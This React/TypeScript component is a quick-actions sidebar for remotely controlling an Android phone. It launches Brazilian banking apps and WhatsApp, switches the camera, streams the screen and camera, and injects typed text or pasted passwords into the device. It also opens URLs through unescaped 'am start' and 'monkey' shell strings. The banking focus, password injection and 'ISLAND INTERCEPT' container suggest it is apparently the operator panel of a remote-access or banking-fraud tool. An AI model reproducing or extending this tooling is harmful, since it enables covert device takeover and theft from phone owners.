import { useState } from "react";
import {
  Globe,
  Lightbulb,
  Pin,
  PinOff,
  RotateCw,
  Send,
  Volume2,
  VolumeX,
  X,
  Zap
} from "lucide-react";
import type { ControlDevice } from "./types";
import { AppLogo } from "./AppLogo";
import { api } from "../../api";

interface Props {
  device: ControlDevice;
  onClose: () => void;
  onMacroAction: (action: string, label: string) => void;
  onSendTouch: (x: number, y: number) => void;
  onSendSwipe: (x1: number, y1: number, x2: number, y2: number) => void;
  onVolumeChange: (vol: number) => void;
  deviceVolume: number;
  isMuted: boolean;
  onToggleMute: () => void;
  activeCamera: "front" | "back";
  onToggleCamera: () => void;
  torchOn: boolean;
  onToggleTorch: () => void;
  activeScreensCount: number;
  onToggleScreen: (type: "tela" | "sr" | "cam") => void;
  telaActive: boolean;
  srActive: boolean;
  camActive: boolean;
  fps: number;
  onChangeFps: (fps: number) => void;
  onAutoFit: () => void;
  showToast: (msg: string, type?: "success" | "info") => void;
}

const QUICK_APPS = [
  { name: "Nubank", pkg: "com.nu.production", category: "Banco" },
  { name: "Inter", pkg: "br.com.intermedium", category: "Banco" },
  { name: "Caixa Tem", pkg: "br.gov.caixa.tem", category: "Banco" },
  { name: "Itaú", pkg: "com.itau", category: "Banco" },
  { name: "Bradesco", pkg: "com.bradesco", category: "Banco" },
  { name: "WhatsApp", pkg: "com.whatsapp", category: "Chat" },
  { name: "Google Chrome", pkg: "com.android.chrome", category: "Web" },
  { name: "Play Store", pkg: "com.android.vending", category: "App" },
  { name: "Configurações", pkg: "com.android.settings", category: "Sistema" }
];

export function RightSidebarQuickActions({
  device,
  onClose,
  onVolumeChange,
  deviceVolume,
  isMuted,
  onToggleMute,
  activeCamera,
  onToggleCamera,
  torchOn,
  onToggleTorch,
  fps,
  onChangeFps,
  showToast
}: Props) {
  const [quickText, setQuickText] = useState("");
  const [quickUrl, setQuickUrl] = useState("https://jadlog.com.br/rastreamento");
  const [isSendingText, setIsSendingText] = useState(false);
  const [isPinned, setIsPinned] = useState(false);

  const handleSendText = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!quickText.trim()) return;
    setIsSendingText(true);
    try {
      await api.sendText(device.id, quickText);
      showToast(`Texto digitado no aparelho: "${quickText}"`, "success");
      setQuickText("");
    } catch {
      showToast("Erro ao transmitir texto para o aparelho.", "info");
    } finally {
      setIsSendingText(false);
    }
  };

  const handleOpenUrl = async () => {
    if (!quickUrl.trim()) return;
    try {
      await api.sendText(device.id, `am start -a android.intent.action.VIEW -d "${quickUrl}"`);
      showToast(`URL aberta no navegador do aparelho: ${quickUrl}`, "success");
    } catch {
      showToast("Erro ao abrir link no dispositivo.", "info");
    }
  };

  const handleLaunchApp = async (pkg: string, name: string) => {
    try {
      const res = await api.launchApp(device.id, pkg);
      if (res?.launchedInIsland) {
        showToast(`⚡ [ISLAND] ${name} aberto no container Sandbox (User ${res.userId || 10})`, "success");
      } else {
        showToast(`Iniciando aplicativo ${name}...`, "success");
      }
    } catch {
      await api.sendText(device.id, `monkey -p ${pkg} -c android.intent.category.LAUNCHER 1`);
      showToast(`Ordem de execução enviada para ${name}.`, "success");
    }
  };

  return (
    <aside className={`tactical-right-quick-sidebar ${isPinned ? "is-pinned" : ""}`}>
      {/* Header Bar */}
      <div className="right-sidebar-header">
        <div className="right-sidebar-title-block">
          <div className="right-sidebar-badge-row">
            <Zap size={14} className="neon-zap-icon" />
            <span className="right-sidebar-title">FUNÇÕES RÁPIDAS</span>
          </div>
          <span className="right-sidebar-sub">
            {device.name} · {device.ip}
          </span>
        </div>

        <div className="right-sidebar-header-actions">
          <button
            type="button"
            className={`tactical-action-btn ${isPinned ? "active" : ""}`}
            onClick={() => setIsPinned(!isPinned)}
            title={isPinned ? "Desafixar barra lateral" : "Fixar barra lateral aberta"}
          >
            {isPinned ? <Pin size={13} /> : <PinOff size={13} />}
          </button>
          <button
            type="button"
            className="tactical-action-btn close-btn"
            onClick={onClose}
            title="Fechar Funções Rápidas (Esc)"
          >
            <X size={15} />
          </button>
        </div>
      </div>

      {/* Scrollable Content Body */}
      <div className="right-sidebar-scroll-body">
        {/* 1. SEÇÃO: CONTROLE RÁPIDO DE ÁUDIO & MULTIMÍDIA */}
        <div className="sidebar-tactical-section">
          <div className="section-label-row">
            <span className="section-lead-tag">ÁUDIO & MULTIMÍDIA</span>
            <span className="section-badge-info" style={{ color: isMuted ? "#ef4444" : "#38bdf8" }}>
              {isMuted ? "MUDO" : `${Math.round((deviceVolume / 15) * 100)}%`}
            </span>
          </div>

          <div className="audio-slider-card">
            <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
              <button
                type="button"
                onClick={onToggleMute}
                className="tactical-action-btn"
                title={isMuted ? "Desmutar" : "Mutar Áudio"}
                style={{ color: isMuted ? "#ef4444" : "#38bdf8" }}
              >
                {isMuted ? <VolumeX size={15} /> : <Volume2 size={15} />}
              </button>
              <input
                type="range"
                min="0"
                max="15"
                step="1"
                value={isMuted ? 0 : deviceVolume}
                onChange={(e) => onVolumeChange(Number(e.target.value))}
                className="tactical-range-input"
                style={{ flex: 1, accentColor: "#38bdf8", cursor: "pointer" }}
              />
            </div>

            <div style={{ display: "flex", gap: "6px", marginTop: "8px" }}>
              <button
                type="button"
                className="secondary compact-btn"
                style={{ flex: 1, fontSize: "10.5px" }}
                onClick={onToggleCamera}
                title="Alternar entre câmera frontal e traseira"
              >
                <RotateCw size={12} />
                <span>Câm: {activeCamera === "back" ? "Traseira" : "Frontal"}</span>
              </button>

              <button
                type="button"
                className={`secondary compact-btn ${torchOn ? "active" : ""}`}
                style={{ flex: 1, fontSize: "10.5px" }}
                onClick={onToggleTorch}
                title="Ligar ou desligar lanterna"
              >
                <Lightbulb size={12} />
                <span>{torchOn ? "Lanterna: ON" : "Lanterna: OFF"}</span>
              </button>
            </div>
          </div>
        </div>

        {/* 2. SEÇÃO: LANÇADOR RÁPIDO DE APPS */}
        <div className="sidebar-tactical-section">
          <div className="section-label-row">
            <span className="section-lead-tag">LANÇADOR RÁPIDO DE APPS</span>
            <span
              className="section-badge-info"
              style={{
                background: "rgba(56, 189, 248, 0.15)",
                color: "#38bdf8",
                border: "1px solid rgba(56, 189, 248, 0.3)"
              }}
              title="Interceptador Island ativo: ao clicar, o app é aberto dentro do container seguro"
            >
              🏝️ ISLAND INTERCEPT
            </span>
          </div>

          <div className="quick-apps-grid">
            {QUICK_APPS.map((app) => (
              <button
                key={app.pkg}
                type="button"
                className="quick-app-card-btn"
                onClick={() => handleLaunchApp(app.pkg, app.name)}
                title={`Abrir ${app.name} (${app.pkg}) no celular`}
              >
                <AppLogo name={app.name} packageName={app.pkg} size={24} />
                <span className="quick-app-name">{app.name}</span>
              </button>
            ))}
          </div>
        </div>

        {/* 3. SEÇÃO: TAXA DE TRANSMISSÃO (FPS) & STATUS */}
        <div className="sidebar-tactical-section">
          <div className="section-label-row">
            <span className="section-lead-tag">TAXA DE TRANSMISSÃO (FPS)</span>
          </div>

          <div className="fps-selector-row">
            {[6, 15, 30].map((rate) => (
              <button
                key={rate}
                type="button"
                className={`fps-chip-btn ${fps === rate ? "active" : ""}`}
                onClick={() => {
                  onChangeFps(rate);
                  showToast(`Taxa ajustada para ${rate} FPS (${rate === 30 ? "Ultra Rápido" : rate === 15 ? "Equilibrado" : "Eco"}).`, "success");
                }}
              >
                {rate} FPS
              </button>
            ))}
          </div>

          <div className="stream-diagnostics-card" style={{ marginTop: "10px" }}>
            <div className="diag-row">
              <span>Latência Média:</span>
              <span style={{ color: "#22c55e", fontWeight: 700 }}>&lt; 35 ms</span>
            </div>
            <div className="diag-row">
              <span>Streaming RAM:</span>
              <span style={{ color: "#38bdf8", fontWeight: 700 }}>Direct In-Memory</span>
            </div>
            <div className="diag-row">
              <span>Resolução do Painel:</span>
              <span style={{ color: "#cbd5e1" }}>720 × 1280 (HD)</span>
            </div>
          </div>
        </div>

        {/* 4. SEÇÃO: DIGITAÇÃO RÁPIDA & ABERTURA DE URL */}
        <div className="sidebar-tactical-section">
          <div className="section-label-row">
            <span className="section-lead-tag">DIGITAÇÃO & NAVEGAÇÃO WEB</span>
          </div>

          {/* Quick Text Injection */}
          <form onSubmit={handleSendText} className="quick-input-form-block">
            <div className="input-with-button">
              <input
                type="text"
                value={quickText}
                onChange={(e) => setQuickText(e.target.value)}
                placeholder="Digitar texto ou colar senha..."
                className="quick-sidebar-input"
              />
              <button
                type="submit"
                disabled={isSendingText || !quickText.trim()}
                className="primary compact-btn send-btn"
                title="Enviar texto ao foco do celular"
              >
                <Send size={13} />
              </button>
            </div>
          </form>

          {/* Quick URL Opener */}
          <div className="quick-input-form-block" style={{ marginTop: "8px" }}>
            <div className="input-with-button">
              <input
                type="text"
                value={quickUrl}
                onChange={(e) => setQuickUrl(e.target.value)}
                placeholder="https://..."
                className="quick-sidebar-input"
              />
              <button
                type="button"
                onClick={handleOpenUrl}
                className="secondary compact-btn send-btn"
                title="Abrir link no navegador do celular"
              >
                <Globe size={13} />
              </button>
            </div>
          </div>
        </div>
      </div>
    </aside>
  );
}
